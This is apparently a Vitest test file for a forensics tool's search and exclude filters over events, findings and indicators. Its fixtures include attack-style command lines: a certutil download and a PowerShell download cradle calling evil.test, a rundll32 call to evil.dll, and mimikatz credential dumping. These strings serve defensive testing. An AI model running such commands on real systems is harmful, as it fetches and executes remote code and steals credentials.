import { describe, it, expect } from "vitest";
import {
  eventMatchesSearch,
  findingMatchesSearch,
  iocMatchesSearch,
  eventMatchesTimeRange,
  eventMatchesExclude,
  findingMatchesExclude,
  iocMatchesExclude,
} from "../../src/analysis/searchFilter.js";
import type { ForensicEvent, Finding, IOC } from "../../src/analysis/stateTypes.js";

function mkEvent(overrides: Partial<ForensicEvent> = {}): ForensicEvent {
  return {
    id: "e1",
    timestamp: "2025-01-15T12:00:00Z",
    description: "powershell.exe spawned encoded command",
    severity: "High",
    mitreTechniques: ["T1059.001"],
    relatedFindingIds: [],
    sourceScreenshots: [],
    asset: "WORKSTATION01",
    sources: ["Velociraptor"],
    ...overrides,
  };
}

function mkFinding(overrides: Partial<Finding> = {}): Finding {
  return {
    id: "f1",
    severity: "High",
    title: "Powershell execution via encoded command",
    description: "Attacker used encoded powershell to evade detection",
    relatedIocs: [],
    sourceScreenshots: [],
    mitreTechniques: ["T1059.001"],
    firstSeen: "2025-01-15T12:00:00Z",
    lastUpdated: "2025-01-15T12:00:00Z",
    status: "open",
    ...overrides,
  };
}

/**
 * A canonical envelope carrying ONLY the branch under test.
 *
 * The real envelope has 20-odd required members; spelling all of them out would bury the one value
 * each of these tests is about. The double cast says that out loud — the alternative, a direct cast
 * the compiler rejects as non-overlapping, failed `npm run typecheck` while vitest (which strips
 * types without checking them) went on reporting green.
 */
function partialCanonical(branch: Record<string, unknown>): ForensicEvent["canonical"] {
  return branch as unknown as ForensicEvent["canonical"];
}

function mkIoc(overrides: Partial<IOC> = {}): IOC {
  return { id: "ioc1", type: "ip", value: "10.0.0.5", firstSeen: "2025-01-15T12:00:00Z", ...overrides };
}

describe("eventMatchesSearch", () => {
  it("empty term matches everything", () => {
    expect(eventMatchesSearch(mkEvent(), "")).toBe(true);
  });
  it("matches description substring (case-insensitive)", () => {
    expect(eventMatchesSearch(mkEvent(), "POWERSHELL")).toBe(true);
    expect(eventMatchesSearch(mkEvent(), "encoded")).toBe(true);
  });
  it("matches asset name", () => {
    expect(eventMatchesSearch(mkEvent(), "workstation01")).toBe(true);
  });
  it("matches MITRE technique", () => {
    expect(eventMatchesSearch(mkEvent(), "t1059")).toBe(true);
    expect(eventMatchesSearch(mkEvent(), "T1059.001")).toBe(true);
  });
  it("matches source tool", () => {
    expect(eventMatchesSearch(mkEvent(), "velociraptor")).toBe(true);
  });
  it("does not match unrelated term", () => {
    expect(eventMatchesSearch(mkEvent(), "mimikatz")).toBe(false);
  });
  it("handles missing optional fields gracefully", () => {
    const e = mkEvent({ asset: undefined, sources: undefined, mitreTechniques: [] });
    expect(eventMatchesSearch(e, "powershell")).toBe(true);
    expect(eventMatchesSearch(e, "missing")).toBe(false);
  });
});

describe("findingMatchesSearch", () => {
  it("empty term matches everything", () => {
    expect(findingMatchesSearch(mkFinding(), "")).toBe(true);
  });
  it("matches title", () => {
    expect(findingMatchesSearch(mkFinding(), "powershell")).toBe(true);
    expect(findingMatchesSearch(mkFinding(), "encoded command")).toBe(true);
  });
  it("matches description", () => {
    expect(findingMatchesSearch(mkFinding(), "evade detection")).toBe(true);
  });
  it("matches MITRE technique", () => {
    expect(findingMatchesSearch(mkFinding(), "t1059")).toBe(true);
  });
  it("does not match unrelated term", () => {
    expect(findingMatchesSearch(mkFinding(), "ransomware")).toBe(false);
  });
});

describe("iocMatchesSearch", () => {
  it("empty term matches everything", () => {
    expect(iocMatchesSearch(mkIoc(), "")).toBe(true);
  });
  it("matches value substring", () => {
    expect(iocMatchesSearch(mkIoc(), "10.0.0.5")).toBe(true);
    expect(iocMatchesSearch(mkIoc(), "10.0.0")).toBe(true);
  });
  it("matches type", () => {
    expect(iocMatchesSearch(mkIoc(), "ip")).toBe(true);
  });
  it("does not match unrelated term", () => {
    expect(iocMatchesSearch(mkIoc(), "domain")).toBe(false);
  });
  it("matches hash value", () => {
    const ioc = mkIoc({ type: "hash", value: "e3b0c44298fc1c149afb" });
    expect(iocMatchesSearch(ioc, "e3b0")).toBe(true);
    expect(iocMatchesSearch(ioc, "hash")).toBe(true);
  });
});

describe("eventMatchesExclude", () => {
  it("empty term list matches nothing (nothing excluded)", () => {
    expect(eventMatchesExclude(mkEvent(), [])).toBe(false);
  });
  it("matches when any term hits (case-insensitive, multi-word)", () => {
    expect(eventMatchesExclude(mkEvent(), ["encoded command"])).toBe(true);
    expect(eventMatchesExclude(mkEvent(), ["mimikatz", "POWERSHELL"])).toBe(true);
  });
  it("does not match when no term hits", () => {
    expect(eventMatchesExclude(mkEvent(), ["mimikatz", "ransomware"])).toBe(false);
  });
  it("ignores blank terms in the list", () => {
    expect(eventMatchesExclude(mkEvent(), ["", "  "])).toBe(false);
  });
});

describe("findingMatchesExclude", () => {
  it("matches when any term hits", () => {
    expect(findingMatchesExclude(mkFinding(), ["ransomware", "evade detection"])).toBe(true);
  });
  it("does not match when no term hits", () => {
    expect(findingMatchesExclude(mkFinding(), ["ransomware"])).toBe(false);
  });
});

describe("iocMatchesExclude", () => {
  it("matches when any term hits", () => {
    expect(iocMatchesExclude(mkIoc(), ["domain", "10.0.0.5"])).toBe(true);
  });
  it("does not match when no term hits", () => {
    expect(iocMatchesExclude(mkIoc(), ["domain"])).toBe(false);
  });
});

describe("eventMatchesTimeRange", () => {
  it("no bounds always matches", () => {
    expect(eventMatchesTimeRange(mkEvent(), null, null)).toBe(true);
    expect(eventMatchesTimeRange(mkEvent(), undefined, undefined)).toBe(true);
  });
  it("event within range matches", () => {
    expect(eventMatchesTimeRange(mkEvent(), "2025-01-15T00:00:00.000Z", "2025-01-16T00:00:00.000Z")).toBe(
      true,
    );
  });
  it("event exactly on 'from' boundary matches", () => {
    expect(eventMatchesTimeRange(mkEvent(), "2025-01-15T12:00:00Z", null)).toBe(true);
  });
  it("event exactly on 'to' boundary matches", () => {
    expect(eventMatchesTimeRange(mkEvent(), null, "2025-01-15T12:00:00Z")).toBe(true);
  });
  it("event before 'from' does not match", () => {
    expect(eventMatchesTimeRange(mkEvent(), "2025-01-16T00:00:00.000Z", null)).toBe(false);
  });
  it("event after 'to' does not match", () => {
    expect(eventMatchesTimeRange(mkEvent(), null, "2025-01-14T00:00:00.000Z")).toBe(false);
  });
  it("event with empty timestamp always matches", () => {
    const e = mkEvent({ timestamp: "" });
    expect(eventMatchesTimeRange(e, "2025-01-01T00:00:00Z", "2025-01-14T00:00:00Z")).toBe(true);
  });
  it("only 'from' bound: events on-or-after pass, events before fail", () => {
    expect(eventMatchesTimeRange(mkEvent(), "2025-01-15T12:00:00Z", null)).toBe(true);
    expect(eventMatchesTimeRange(mkEvent(), "2025-01-15T13:00:00Z", null)).toBe(false);
  });
  it("only 'to' bound: events on-or-before pass, events after fail", () => {
    expect(eventMatchesTimeRange(mkEvent(), null, "2025-01-15T12:00:00Z")).toBe(true);
    expect(eventMatchesTimeRange(mkEvent(), null, "2025-01-15T11:00:00Z")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// #928: full-text search across all forensic events.
//
// The matcher used to read four fields (description/asset/mitre/sources), so an analyst searching
// for a command line, a hash or a raw EVTX message found nothing — the evidence was in the event,
// just not in the haystack. These cover the widened matcher AND the deliberate decision NOT to
// widen the exclude filter with it.
// ---------------------------------------------------------------------------
describe("eventMatchesSearch (widened, #928)", () => {
  it("matches the full untruncated message", () => {
    const e = mkEvent({ message: "powershell.exe -enc SQBFAFgA cradle" });
    expect(eventMatchesSearch(e, "-enc")).toBe(true);
    expect(eventMatchesSearch(e, "sqbefgxa")).toBe(false);
  });
  it("matches the command line", () => {
    const e = mkEvent({ commandLine: "rundll32.exe C:\\temp\\evil.dll,Start" });
    expect(eventMatchesSearch(e, "rundll32")).toBe(true);
    expect(eventMatchesSearch(e, "evil.dll")).toBe(true);
  });
  it("matches file path, process name and parent name", () => {
    const e = mkEvent({
      path: "C:\\Users\\bob\\AppData\\evil.exe",
      processName: "evil.exe",
      parentName: "winword.exe",
    });
    expect(eventMatchesSearch(e, "appdata")).toBe(true);
    expect(eventMatchesSearch(e, "winword")).toBe(true);
  });
  it("matches hashes", () => {
    const e = mkEvent({ sha256: "e3b0c44298fc1c149afbf4c8996fb924", md5: "d41d8cd98f00b204e9800998" });
    expect(eventMatchesSearch(e, "e3b0c442")).toBe(true);
    expect(eventMatchesSearch(e, "d41d8cd9")).toBe(true);
  });
  it("matches the artifact name", () => {
    expect(eventMatchesSearch(mkEvent({ artifactName: "Windows.NTFS.MFT" }), "ntfs")).toBe(true);
  });
  it("matches values inside the canonical envelope", () => {
    const e = mkEvent({
      canonical: partialCanonical({
        process: { commandLine: "certutil -urlcache -f http://evil.test/p.exe" },
        network: { destination: { address: "203.0.113.9", port: 4444 } },
      }),
    });
    expect(eventMatchesSearch(e, "certutil")).toBe(true);
    expect(eventMatchesSearch(e, "203.0.113.9")).toBe(true);
    expect(eventMatchesSearch(e, "4444")).toBe(true);
  });
  it("does not match canonical FIELD NAMES, only values", () => {
    const e = mkEvent({ canonical: partialCanonical({ process: { commandLine: "whoami" } }) });
    expect(eventMatchesSearch(e, "commandline")).toBe(false);
  });
  // The decoded payload is the READABLE form of an obfuscated command, and the timeline shows it.
  // An analyst reads it there and searches for it; before this it was the one form of the evidence
  // that could not be found, because deobfuscation writes it nowhere else.
  it("matches the decoded payload of an obfuscated command", () => {
    const e = mkEvent({
      description: "powershell.exe -enc SQBFAFgA",
      deobfuscated: {
        decoded: "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')",
        method: "powershell-enc",
        iocs: ["i001"],
      },
    });
    for (const term of ["downloadstring", "evil.test/a.ps1", "new-object net.webclient"]) {
      expect(eventMatchesSearch(e, term), term).toBe(true);
    }
  });

  it("does not search the deobfuscation method or its extracted ioc ids", () => {
    // A classifier and a list of internal ids — searching either would return every decoded event.
    const e = mkEvent({
      deobfuscated: { decoded: "whoami", method: "powershell-enc", iocs: ["i001"] },
    });
    expect(eventMatchesSearch(e, "powershell-enc")).toBe(false);
    expect(eventMatchesSearch(e, "i001")).toBe(false);
  });

  it("still matches everything the narrow matcher did", () => {
    expect(eventMatchesSearch(mkEvent(), "POWERSHELL")).toBe(true);
    expect(eventMatchesSearch(mkEvent(), "workstation01")).toBe(true);
    expect(eventMatchesSearch(mkEvent(), "t1059")).toBe(true);
    expect(eventMatchesSearch(mkEvent(), "velociraptor")).toBe(true);
  });
});

describe("eventMatchesExclude stays narrow (#928)", () => {
  // Widening exclude along with search would silently change what every SAVED exclude chip hides —
  // and in DFIR the failure mode of hiding MORE evidence than the analyst asked for is the bad one.
  it("does not exclude on the newly-searchable fields", () => {
    const e = mkEvent({ message: "mimikatz sekurlsa::logonpasswords", commandLine: "mimikatz.exe" });
    expect(eventMatchesSearch(e, "mimikatz")).toBe(true);
    expect(eventMatchesExclude(e, ["mimikatz"])).toBe(false);
  });
  it("still excludes on the four legacy fields", () => {
    expect(eventMatchesExclude(mkEvent(), ["encoded command"])).toBe(true);
    expect(eventMatchesExclude(mkEvent(), ["workstation01"])).toBe(true);
  });
});

describe("iocMatchesSearch note (#928)", () => {
  it("matches the analyst note", () => {
    const ioc = mkIoc({ note: "DC01 domain controller" });
    expect(iocMatchesSearch(ioc, "dc01")).toBe(true);
  });
  it("matches merged alias values", () => {
    const ioc = mkIoc({ type: "domain", value: "www.evil.com", aliasValues: ["evil.com"] });
    expect(iocMatchesSearch(ioc, "evil.com")).toBe(true);
  });
  it("exclude stays narrow — note does not hide the IOC", () => {
    const ioc = mkIoc({ note: "DC01 domain controller" });
    expect(iocMatchesExclude(ioc, ["dc01"])).toBe(false);
  });
});
